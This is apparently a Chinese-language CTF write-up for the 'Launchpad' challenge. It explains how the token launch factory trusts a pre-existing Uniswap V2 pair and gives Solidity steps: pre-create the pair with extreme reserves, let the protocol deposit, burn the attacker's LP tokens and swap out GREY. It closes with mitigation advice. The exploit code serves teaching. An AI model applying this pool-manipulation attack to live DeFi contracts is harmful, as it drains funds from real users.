# Launchpad

## 题目简述

题目实现了一个 bonding curve 代币发行平台：MEME 募集到目标 GREY 后，`Factory.launchToken` 会把剩余 MEME 和实际募得的 GREY 迁移到 Uniswap V2。玩家可领取 $5$ GREY，目标是最终持有至少 $5.965$ GREY。

漏洞不在恒定乘积公式本身，而在迁移逻辑默认信任了一个任何人都能预先创建、注入极端储备比例的 Uniswap 交易对。

## 解题过程

Setup 先用 $2$ GREY 购买 MEME，bonding curve 的虚拟 GREY 流动性也是 $2$，目标实际募资为 $6$。领取玩家的 $5$ GREY 后，用其中 $5-1\text{ wei}$ 继续买入 MEME，实际募资刚好达到启动阈值，同时保留 $1\text{ wei}$ GREY。

在调用 `launchToken` 前，主动创建 GREY/MEME 交易对，把刚买到的 MEME 全部转入 pair，只配入 $1\text{ wei}$ GREY，然后调用 `mint`。这样先建立一个 GREY 极少、MEME 极多的畸形初始储备：

```solidity
setup.grey().approve(address(setup.factory()), 5e18 - 1);
uint256 memeAmount = setup.factory().buyTokens(address(setup.meme()), 5e18 - 1, 0);

address pair = setup.uniswapV2Factory().createPair(
    address(setup.grey()), address(setup.meme())
);
setup.meme().transfer(pair, memeAmount);
setup.grey().transfer(pair, 1);
uint256 liquidity = UniswapV2Pair(pair).mint(address(this));
```

`launchToken` 使用 `getPair` 复用已有 pair，只把平台的 $6$ GREY 和剩余 MEME 直接转入并再次 `mint`，却没有验证迁移前储备是否为空或价格是否合理。因为攻击者掌握初始 LP，启动后立即销毁自己的 LP，可按份额取回大量资产：

```solidity
setup.factory().launchToken(address(setup.meme()));
UniswapV2Pair(pair).transfer(pair, liquidity);
UniswapV2Pair(pair).burn(address(this));
```

最后把取回的 MEME 转回 pair，并交换约 $1.65$ GREY，即可使余额越过 $5.965$ GREY：

```solidity
setup.meme().transfer(pair, setup.meme().balanceOf(address(this)));
UniswapV2Pair(pair).swap(1.65e18, 0, address(this), "");
```

验证成功后得到：

```text
grey{pump_not_fun_447149e3}
```

## 方法总结

协议把流动性迁移到外部 AMM 时，必须验证目标 pair 的创建者、既有储备和初始价格，或者由协议在不可抢跑的流程中创建并初始化。仅依赖 `getPair` 并向任意已有池直接注资，会把协议资产按攻击者预先布置的比例送入池中。本题的通用利用模型是“预创建池 → 极端初始比例 → 协议注资 → 撤出攻击者 LP → 再交换获利”。
